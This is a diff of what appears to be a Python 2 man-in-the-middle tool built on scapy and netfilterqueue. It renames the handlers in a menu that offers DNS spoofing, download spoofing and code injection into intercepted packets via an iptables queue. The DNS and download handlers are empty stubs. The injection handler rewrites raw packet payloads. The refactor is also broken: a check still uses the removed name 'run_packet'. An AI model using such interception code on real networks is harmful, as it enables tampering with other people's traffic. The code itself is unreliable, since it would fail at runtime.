@@ -215,15 +215,15 @@ def set_load_data(packet, load):
     del packet[scapy.TCP].chksum
     return packet
 
-def dns_packet(packet):
+def dns_callback(packet):
     # TODO
     packet.accept()
 
-def download_packet(packet):
+def download_callback(packet):
     # TODO
     packet.accept()
 
-def inject_packet(packet):
+def inject_callback(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         load = scapy_packet[scapy.Raw].load
@@ -245,27 +245,27 @@ def inject_packet(packet):
             packet.set_payload(str(new_packet))
     packet.accept()
 
-def packet_switch():
+def callback_switch():
     opt = raw_input("What do you want? ('d' - dns spoof, 'ds' - download spoof, 'ic' - inject code): ")
     if "d" == opt:
-        packet = dns_packet
+        packet = dns_callback
     elif "ds" == opt:
-        packet = download_packet
+        packet = download_callback
     elif "ic" == opt:
-        packet = inject_packet
+        packet = inject_callback
     return packet
 
-# THE MAIN FUNCTION FOR CODE INJECTION <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-def code_injector():
+# THE MAIN FUNCTION FOR PACKET MODIFICATION <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+def packet_modificator():
     opt = set_presets()
     if "as" == opt:
         port = 10000
-    run_packet = packet_switch()
+    modifier_callback = callback_switch()
     if not run_packet:
-        run_packet = packet_switch()
+        modifier_callback = callback_switch()
     try:
         queue = netfilterqueue.NetfilterQueue()
-        queue.bind(0, run_packet)
+        queue.bind(0, modifier_callback)
         queue.run()
     except (KeyboardInterrupt, BaseException), e:
         print("WARNING! Something get wrong!... Flushing IP-tables... Please wait...")
@@ -285,7 +285,7 @@ def cmd_switch():
     elif "t" == cmd:
         traffic_sniffer()  # independent
     elif "c" == cmd:
-        code_injector()  # independent
+        packet_modificator()  # independent
     elif "e" == cmd:
         sys.exit()
     return cmd
